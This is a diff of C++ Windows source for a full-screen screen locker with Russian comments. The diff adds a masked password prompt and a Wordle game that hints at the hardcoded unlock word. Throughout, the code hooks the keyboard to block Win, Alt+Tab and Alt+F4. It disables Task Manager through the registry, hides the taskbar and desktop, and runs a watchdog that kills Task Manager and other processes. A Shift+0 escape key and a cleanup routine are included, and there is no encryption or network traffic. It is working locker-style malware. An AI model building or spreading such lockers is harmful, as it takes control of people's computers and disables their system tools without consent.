@@ -18,11 +18,17 @@
 using namespace Gdiplus;
 
 // --- КОНФИГУРАЦИЯ ---
-const std::wstring SECRET_WORD = L"ПЕНИС"; // Загаданное слово
+// Обновленный пароль (6 букв)
+const std::wstring SECRET_WORD = L"ПЕРЧИК"; 
 const int MAX_ATTEMPTS = 6;
 // --------------------
 
-// Глобальные переменные
+enum AppState {
+    STATE_LOGIN,
+    STATE_WORDLE
+};
+
+AppState currentState = STATE_LOGIN;
 HWND hMainWnd = NULL;
 bool locked = true;
 HHOOK hKeyboardHook = NULL;
@@ -30,33 +36,34 @@ ULONG_PTR gdiplusToken;
 
 struct GuessRow {
     std::wstring letters;
-    int colors[5]; // 0=None, 1=Gray, 2=Yellow, 3=Green
+    int colors[6]; // Увеличено до 6, так как слово "ПЕРЧИК" - 6 букв
 };
 std::vector<GuessRow> guesses;
-std::wstring currentInput = L"";
+std::wstring wordleInput = L"";
 bool gameWon = false;
 bool gameLost = false;
 
-// --- БЛОКИРОВКА СИСТЕМЫ ---
+std::wstring passwordInput = L"";
+bool passwordError = false;
 
+// --- БЛОКИРОВКА КЛАВИАТУРЫ ---
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = pKbStruct->vkCode;
 
-        // PANIC KEY: SHIFT + 0 (Аварийный выход)
+        // Panic Key: SHIFT + 0 - всегда работает для безопасности
         if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
             locked = false;
             PostQuitMessage(0);
             return 1;
         }
 
-        // Блокировка системных клавиш
+        // Блокировка переключения задач и меню пуск
         if (vkCode == VK_LWIN || vkCode == VK_RWIN || vkCode == VK_APPS) return 1;
-        if (vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Alt+Tab
-        if (vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1; // Ctrl+Esc
-        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Alt+F4
-        if (vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Ctrl+Alt+Del
+        if (vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
+        if (vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1; 
+        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
     }
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
@@ -80,6 +87,7 @@ void KillProcessByName(const wchar_t* processName) {
     CloseHandle(hSnapshot);
 }
 
+// Блокировка диспетчера задач через реестр
 void SecureSystem() {
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -87,21 +95,26 @@ void SecureSystem() {
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
+    // Скрытие панели задач и рабочего стола
     ShowWindow(FindWindowW(L"Progman", NULL), SW_HIDE);
     ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
 }
 
+// ВОССТАНОВЛЕНИЕ СИСТЕМЫ (Разблокировка)
 void UnlockSystem() {
+    // 1. Возвращаем диспетчер задач
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        DWORD value = 0;
+        DWORD value = 0; // 0 = включить обратно
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
+    // 2. Показываем рабочий стол и панель задач
     ShowWindow(FindWindowW(L"Progman", NULL), SW_SHOW);
     ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_SHOW);
 }
 
+// Поток, следящий за тем, чтобы не запускали CMD или TaskMgr в обход
 void Watchdog() {
     while (locked) {
         KillProcessByName(L"taskmgr.exe");
@@ -111,25 +124,46 @@ void Watchdog() {
     }
 }
 
-// --- ЛОГИКА ИГРЫ ---
+// --- ЛОГИКА ---
 
-void CheckGuess() {
-    if (currentInput.length() != 5) return;
+void CheckMainPassword() {
+    if (passwordInput == SECRET_WORD) {
+        locked = false;
+        PostMessage(hMainWnd, WM_CLOSE, 0, 0);
+    } else {
+        passwordError = true;
+        passwordInput = L"";
+        InvalidateRect(hMainWnd, NULL, FALSE);
+        std::thread([](){
+            std::this_thread::sleep_for(std::chrono::seconds(2));
+            if (locked) {
+                passwordError = false;
+                InvalidateRect(hMainWnd, NULL, FALSE);
+            }
+        }).detach();
+    }
+}
+
+void CheckWordleGuess() {
+    size_t len = SECRET_WORD.length(); // 6 для ПЕРЧИК
+    if (wordleInput.length() != len) return;
 
     GuessRow newGuess;
-    newGuess.letters = currentInput;
+    newGuess.letters = wordleInput;
     std::wstring tempSecret = SECRET_WORD; 
-    for(int i=0; i<5; i++) newGuess.colors[i] = 1; // Gray
+    
+    // Инициализация
+    for(size_t i=0; i<len; i++) newGuess.colors[i] = 1; 
 
     // Зеленые
-    for (int i = 0; i < 5; i++) {
+    for (size_t i = 0; i < len; i++) {
         if (newGuess.letters[i] == tempSecret[i]) {
             newGuess.colors[i] = 3;
             tempSecret[i] = L'*';
         }
     }
     // Желтые
-    for (int i = 0; i < 5; i++) {
+    for (size_t i = 0; i < len; i++) {
         if (newGuess.colors[i] == 3) continue;
         size_t foundPos = tempSecret.find(newGuess.letters[i]);
         if (foundPos != std::wstring::npos) {
@@ -139,7 +173,7 @@ void CheckGuess() {
     }
     guesses.push_back(newGuess);
 
-    if (currentInput == SECRET_WORD) {
+    if (wordleInput == SECRET_WORD) {
         gameWon = true;
         std::thread([](){
             std::this_thread::sleep_for(std::chrono::seconds(2));
@@ -151,48 +185,73 @@ void CheckGuess() {
         std::thread([](){
             std::this_thread::sleep_for(std::chrono::seconds(2));
             guesses.clear();
-            currentInput = L"";
+            wordleInput = L"";
             gameLost = false;
             InvalidateRect(hMainWnd, NULL, FALSE);
         }).detach();
     }
-    currentInput = L"";
+    wordleInput = L"";
 }
 
 // --- ОТРИСОВКА ---
 
-void DrawScreen(HDC hdc, int width, int height) {
-    Graphics graphics(hdc);
-    graphics.SetTextRenderingHint(TextRenderingHintAntiAlias);
-
-    // Темный фон
-    SolidBrush bgBrush(Color(255, 15, 15, 20));
-    graphics.FillRectangle(&bgBrush, 0, 0, width, height);
-
-    // Шрифты с поддержкой кириллицы
-    FontFamily fontFamily(L"Segoe UI"); // Стандартный системный шрифт
-    Font fontHeader(&fontFamily, 36, FontStyleBold, UnitPixel);
-    Font fontSub(&fontFamily, 20, FontStyleRegular, UnitPixel);
-    Font fontLetter(&fontFamily, 32, FontStyleBold, UnitPixel);
-
+void DrawLoginScreen(Graphics& g, int width, int height, FontFamily& fontFamily) {
+    Font fontHeader(&fontFamily, 40, FontStyleBold, UnitPixel);
+    Font fontInput(&fontFamily, 32, FontStyleRegular, UnitPixel);
+    Font fontHint(&fontFamily, 20, FontStyleRegular, UnitPixel);
     SolidBrush redBrush(Color(255, 255, 60, 60));
     SolidBrush whiteBrush(Color(255, 240, 240, 240));
+    SolidBrush grayBrush(Color(255, 100, 100, 100));
     StringFormat centerFormat;
     centerFormat.SetAlignment(StringAlignmentCenter);
 
-    // Текст
-    graphics.DrawString(L"ДОСТУП ЗАБЛОКИРОВАН", -1, &fontHeader, PointF(width / 2.0f, 50.0f), &centerFormat, &redBrush);
-    graphics.DrawString(L"Введите пароль, чтобы вернуть управление.\nПереключите язык на РУССКИЙ и вводите буквы.", -1, &fontSub, PointF(width / 2.0f, 100.0f), &centerFormat, &whiteBrush);
+    g.DrawString(L"СИСТЕМА ЗАБЛОКИРОВАНА", -1, &fontHeader, PointF(width / 2.0f, height * 0.2f), &centerFormat, &redBrush);
 
-    // Сетка
+    RectF inputRect(width / 2.0f - 200, height * 0.4f, 400, 50);
+    Pen borderPen(Color(255, 255, 255, 255), 2);
+    g.DrawRectangle(&borderPen, inputRect);
+
+    std::wstring maskedPass(passwordInput.length(), L'*');
+    if (maskedPass.empty()) {
+        g.DrawString(L"Введите пароль...", -1, &fontHint, PointF(width / 2.0f, height * 0.4f + 10), &centerFormat, &grayBrush);
+    } else {
+        g.DrawString(maskedPass.c_str(), -1, &fontInput, PointF(width / 2.0f, height * 0.4f + 5), &centerFormat, &whiteBrush);
+    }
+
+    if (passwordError) {
+        g.DrawString(L"НЕВЕРНЫЙ ПАРОЛЬ", -1, &fontHint, PointF(width / 2.0f, height * 0.4f + 60), &centerFormat, &redBrush);
+    }
+
+    g.DrawString(L"Нажмите [TAB], чтобы сыграть в игру", -1, &fontHint, PointF(width / 2.0f, height * 0.7f), &centerFormat, &whiteBrush);
+    
+    RectF btnRect(width / 2.0f - 150, height * 0.75f, 300, 60);
+    SolidBrush btnBrush(Color(255, 40, 40, 80));
+    g.FillRectangle(&btnBrush, btnRect);
+    g.DrawRectangle(&borderPen, btnRect);
+    g.DrawString(L"ИГРАТЬ В WORDLE", -1, &fontHeader, PointF(width / 2.0f, height * 0.75f + 5), &centerFormat, &whiteBrush);
+}
+
+void DrawWordleScreen(Graphics& g, int width, int height, FontFamily& fontFamily) {
+    Font fontHeader(&fontFamily, 36, FontStyleBold, UnitPixel);
+    Font fontLetter(&fontFamily, 32, FontStyleBold, UnitPixel);
+    SolidBrush whiteBrush(Color(255, 240, 240, 240));
+    SolidBrush redBrush(Color(255, 255, 60, 60));
+    SolidBrush greenBrush(Color(255, 0, 255, 0));
+    StringFormat centerFormat;
+    centerFormat.SetAlignment(StringAlignmentCenter);
+
+    g.DrawString(L"WORDLE: УГАДАЙ ПАРОЛЬ", -1, &fontHeader, PointF(width / 2.0f, 50.0f), &centerFormat, &whiteBrush);
+    g.DrawString(L"[ESC] - Назад", -1, &fontLetter, PointF(width / 2.0f, height - 80.0f), &centerFormat, &whiteBrush);
+
+    int wordLen = 6; // ПЕРЧИК
     int boxSize = 60;
     int gap = 12;
-    int startX = (width - (5 * boxSize + 4 * gap)) / 2;
-    int startY = 220;
+    int startX = (width - (wordLen * boxSize + (wordLen-1) * gap)) / 2;
+    int startY = 150;
     Pen borderPen(Color(255, 100, 100, 100), 2);
 
     for (size_t r = 0; r < MAX_ATTEMPTS; r++) {
-        for (int c = 0; c < 5; c++) {
+        for (int c = 0; c < wordLen; c++) {
             Rect rect(startX + c * (boxSize + gap), startY + r * (boxSize + gap), boxSize, boxSize);
             Color fillColor = Color(0, 0, 0, 0);
             wchar_t letter = 0;
@@ -200,33 +259,32 @@ void DrawScreen(HDC hdc, int width, int height) {
             if (r < guesses.size()) {
                 letter = guesses[r].letters[c];
                 int col = guesses[r].colors[c];
-                if (col == 1) fillColor = Color(255, 60, 60, 60); // Серый
-                if (col == 2) fillColor = Color(255, 210, 180, 0); // Желтый
-                if (col == 3) fillColor = Color(255, 0, 180, 0);   // Зеленый
-            } else if (r == guesses.size() && c < currentInput.length()) {
-                letter = currentInput[c];
+                if (col == 1) fillColor = Color(255, 60, 60, 60); 
+                if (col == 2) fillColor = Color(255, 210, 180, 0); 
+                if (col == 3) fillColor = Color(255, 0, 180, 0);   
+            } else if (r == guesses.size() && c < wordleInput.length()) {
+                letter = wordleInput[c];
                 fillColor = Color(255, 40, 40, 45);
             }
 
             if (fillColor.GetAlpha() > 0) {
                 SolidBrush fillBrush(fillColor);
-                graphics.FillRectangle(&fillBrush, rect);
+                g.FillRectangle(&fillBrush, rect);
             }
-            graphics.DrawRectangle(&borderPen, rect);
+            g.DrawRectangle(&borderPen, rect);
 
             if (letter != 0) {
                 wchar_t s[2] = { letter, 0 };
                 RectF rectF((REAL)rect.X, (REAL)rect.Y + 10, (REAL)rect.Width, (REAL)rect.Height);
-                graphics.DrawString(s, -1, &fontLetter, rectF, &centerFormat, &whiteBrush);
+                g.DrawString(s, -1, &fontLetter, rectF, &centerFormat, &whiteBrush);
             }
         }
     }
 
     if (gameWon) {
-        SolidBrush greenBrush(Color(255, 0, 255, 0));
-        graphics.DrawString(L"ПАРОЛЬ ПРИНЯТ. РАЗБЛОКИРОВКА...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &greenBrush);
+        g.DrawString(L"ПРАВИЛЬНО! РАЗБЛОКИРОВКА...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &greenBrush);
     } else if (gameLost) {
-        graphics.DrawString(L"ОШИБКА ДОСТУПА. СБРОС ПОПЫТОК...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &redBrush);
+        g.DrawString(L"НЕУДАЧА. СБРОС...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &redBrush);
     }
 }
 
@@ -255,7 +313,20 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
         HDC memDC = CreateCompatibleDC(hdc);
         HBITMAP memBM = CreateCompatibleBitmap(hdc, rc.right, rc.bottom);
         SelectObject(memDC, memBM);
-        DrawScreen(memDC, rc.right, rc.bottom);
+
+        Graphics g(memDC);
+        g.SetTextRenderingHint(TextRenderingHintAntiAlias);
+        SolidBrush bgBrush(Color(255, 15, 15, 20));
+        g.FillRectangle(&bgBrush, 0, 0, rc.right, rc.bottom);
+
+        FontFamily fontFamily(L"Segoe UI");
+
+        if (currentState == STATE_LOGIN) {
+            DrawLoginScreen(g, rc.right, rc.bottom, fontFamily);
+        } else {
+            DrawWordleScreen(g, rc.right, rc.bottom, fontFamily);
+        }
+
         BitBlt(hdc, 0, 0, rc.right, rc.bottom, memDC, 0, 0, SRCCOPY);
         DeleteObject(memBM);
         DeleteDC(memDC);
@@ -265,40 +336,62 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
 
     case WM_ERASEBKGND: return 1;
 
+    case WM_LBUTTONDOWN: {
+        if (currentState == STATE_LOGIN) {
+            RECT rc;
+            GetClientRect(hWnd, &rc);
+            int y = HIWORD(lParam);
+            if (y > rc.bottom * 0.7f) {
+                currentState = STATE_WORDLE;
+                InvalidateRect(hWnd, NULL, FALSE);
+            }
+        }
+        return 0;
+    }
+
     case WM_CHAR: {
-        if (!locked || gameWon || gameLost) break;
+        if (!locked) break;
         wchar_t ch = (wchar_t)wParam;
+        CharUpperBuffW(&ch, 1); 
 
-        if (ch == VK_BACK) {
-            if (!currentInput.empty()) {
-                currentInput.pop_back();
+        if (currentState == STATE_LOGIN) {
+            if (ch == VK_TAB) { 
+                currentState = STATE_WORDLE;
                 InvalidateRect(hWnd, NULL, FALSE);
+                return 0;
             }
-            return 0;
-        }
+            if (ch == VK_RETURN) { 
+                CheckMainPassword();
+                return 0;
+            }
+            if (ch == VK_BACK) {
+                if (!passwordInput.empty()) passwordInput.pop_back();
+            } else if (ch >= 32) { 
+                passwordInput += ch;
+            }
+            InvalidateRect(hWnd, NULL, FALSE);
 
-        if (ch == VK_RETURN) {
-            if (currentInput.length() == 5) {
-                CheckGuess();
+        } else {
+            if (ch == VK_ESCAPE) { 
+                currentState = STATE_LOGIN;
                 InvalidateRect(hWnd, NULL, FALSE);
+                return 0;
             }
-            return 0;
-        }
+            if (gameWon || gameLost) return 0;
 
-        // --- УЛУЧШЕННАЯ ОБРАБОТКА РУССКОГО ВВОДА ---
-        // Преобразуем символ в верхний регистр средствами Windows
-        CharUpperBuffW(&ch, 1);
-
-        if (currentInput.length() < 5) {
-            // Проверка диапазонов Unicode:
-            // A-Z, А-Я (0410-042F), Ё (0401)
-            bool isLatin = (ch >= 'A' && ch <= 'Z');
-            bool isCyrillic = (ch >= 0x0410 && ch <= 0x044F) || (ch == 0x0401);
-
-            if (isLatin || isCyrillic) {
-                currentInput += ch;
-                InvalidateRect(hWnd, NULL, FALSE);
+            if (ch == VK_BACK) {
+                if (!wordleInput.empty()) wordleInput.pop_back();
+            } else if (ch == VK_RETURN) {
+                CheckWordleGuess();
+            } else {
+                bool isLatin = (ch >= 'A' && ch <= 'Z');
+                bool isCyrillic = (ch >= 0x0410 && ch <= 0x044F) || (ch == 0x0401);
+                // Проверяем длину слова (теперь 6 букв)
+                if ((isLatin || isCyrillic) && wordleInput.length() < 6) {
+                    wordleInput += ch;
+                }
             }
+            InvalidateRect(hWnd, NULL, FALSE);
         }
         return 0;
     }
@@ -321,17 +414,15 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
     WNDCLASSW wc = {0};
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
-    wc.lpszClassName = L"RuLocker";
+    wc.lpszClassName = L"FinalLocker";
     wc.hCursor = LoadCursor(NULL, IDC_ARROW);
     RegisterClassW(&wc);
 
     int screenW = GetSystemMetrics(SM_CXSCREEN);
     int screenH = GetSystemMetrics(SM_CYSCREEN);
     
-    hMainWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"RuLocker", NULL,
+    hMainWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"FinalLocker", NULL,
         WS_POPUP | WS_VISIBLE, 0, 0, screenW, screenH, NULL, NULL, hInstance, NULL);
-
-    // ShowCursor(FALSE); // Раскомментируй, чтобы скрыть мышь совсем
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -341,7 +432,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
 
     locked = false;
     watchdogThread.detach();
-    UnlockSystem();
+    UnlockSystem(); // Вызов разблокировки при выходе
     if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
     ClipCursor(NULL);
     GdiplusShutdown(gdiplusToken);
